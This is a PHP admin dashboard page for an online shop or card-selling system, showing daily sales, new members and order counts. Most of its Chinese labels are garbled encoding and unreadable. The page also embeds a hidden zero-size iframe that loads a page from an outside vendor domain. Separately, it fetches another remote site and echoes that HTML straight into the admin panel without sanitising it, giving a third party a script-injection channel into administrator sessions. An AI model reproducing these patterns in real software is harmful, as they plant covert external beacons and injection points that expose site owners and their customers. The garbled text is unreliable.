<?php 
include_once('../jhs_config/function.php');
include_once('../jhs_config/admin_check.php');
include_once('../jhs_config/page_class.php'); 
$now = strtotime(date('Y-m-d'));
$now2 = strtotime(date("Y-m-d",strtotime("-1 day")));
?>
<meta charset="gb2312">
<link rel="stylesheet" href="css/layui.css" media="all">
<link rel="stylesheet" href="css/admin.css" media="all">
<div class="layui-fluid">
    <div class="layui-row layui-col-space15">
          <div class="layui-col-md22">
            <div class="layui-card">
              <div class="layui-card-header">��������</div>
              <div class="layui-card-body">
                <div class="layui-carousel layadmin-carousel layadmin-backlog" lay-anim="" lay-indicator="inside" lay-arrow="none" style="width: 100%; height: 280px;">
                  <div carousel-item="">
                    <ul class="layui-row layui-col-space10 layui-this">
                      <li class="layui-col-xs6">
                        <a class="layadmin-backlog-body">
                          <h3>��Ч���۶Ԫ��</h3>
                          <p><cite><?php
$ress=mysql_query("SELECT sum(zongprice) FROM product_order  where time >= $now  and time < $now+24*3600  and trading !=3 ",$conn1);
$sum1=mysql_result($ress,0);
?><?=number_format($sum1,3);?> </cite></p>
                        </a>
                      </li>
                      <li class="layui-col-xs6">
                        <a class="layadmin-backlog-body">
                          <h3>��ע���û����ˣ�</h3>
                          <p><cite><?php
$ress=mysql_num_rows(mysql_query("SELECT * FROM members  where time >= $now  and time < $now+24*3600 ",$conn1));
echo $ress; ?></cite></p>
                        </a>
                      </li>
                      <li class="layui-col-xs6">
                        <a class="layadmin-backlog-body">
                          <h3>δ�����������ʣ�</h3>
                          <p><cite><?php		
$total=mysql_num_rows(mysql_query("select * from product_order  ",$conn1));
echo $total;
?></cite></p>
                        </a>
                      </li>
                      <li class="layui-col-xs6">
                        <a class="layadmin-backlog-body">
                          <h3>�û�Ͷ�߶������ʣ�</h3>
                          <p><cite><?php		
$total=mysql_num_rows(mysql_query("select * from product_order where trading=3 ",$conn1));
echo $total;
?></cite></p>
                        </a>
                      </li>
                    </ul>
                    <ul class="layui-row layui-col-space10">
                      <li class="layui-col-xs6">
                        <a href="javascript:;" class="layadmin-backlog-body">
                          <h3>������������</h3>
                          <p><cite style="color: #FF5722;">5</cite></p>
                        </a>
                      </li>
                    </ul>
                  </div>
               
              </div>
            </div>
          </div>
      <div class="layui-col-md15">
        <div class="layui-card">
          <div class="layui-card-header">ϵͳ��Ϣ</div>
          <div class="layui-card-body layui-text">
            <table class="layui-table">
              <colgroup>
                <col width="100">
                <col>
              </colgroup>
              <tbody>
				<tr>
                  <td>��ǰ����</td>
                  <td>
				  ��ʹ����Ŷӿ���Դ��</td>
                </tr>
				<tr>
                  <td>ԭʼ����</td>
                  <td>
				  ���ѿ� - ����������Ϣ�Ƽ����޹�˾</td>
                </tr>
				                <tr>
                  <td>��վʱ��</td>
                  <td>
                    <a href="JavaScript:alert('��װʱ��ָ������վ���ݿ������ļ�������޸�ʱ��{/jhs_config/conn.php}')"><?php
$filename = "../jhs_config/conn.php";
echo date("Y-m-d H:i:s",filemtime($filename));
?></a>  
                  </td>
                </tr>
                <tr>
                  <td>��ǰ�汾</td>
                  <td>
                    <a class="layui-btn layui-btn-primary layui-btn-xs" href="http://www.juheshe.cn" target="_blank"> <?
					$url='../jhs_config/JUHESHEedition.txt'; 
					$html = file_get_contents($url); 
					echo $html; 
					?></a>
                  </td>
                </tr>
				
				   <tr>
                  <td>���°汾</td>
                  <td>
				  <a class="layui-btn layui-btn-xs layui-btn-danger" href="https://www.m213.cn" target="_blank">
				  <?
					$url='https://www.m213.cn'; 
					$html = file_get_contents($url); 
					echo $html; 
					?>
					</a>
                  </td>
                </tr>
 
                <tr>
                  <td>��Ʒ����</td>
                  <td style="padding-bottom: 0;">
                    <div class="layui-btn-container">
                      <a href="https://www.m213.cn" target="_blank" class="layui-btn layui-btn-sm">����С��Դ������</a>
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

      </div>
    </div>
  </div>
  <iframe style="width:0px;height:0px;" frameborder="0" src="http://www.juheshe.cn/card/gg.html"></iframe>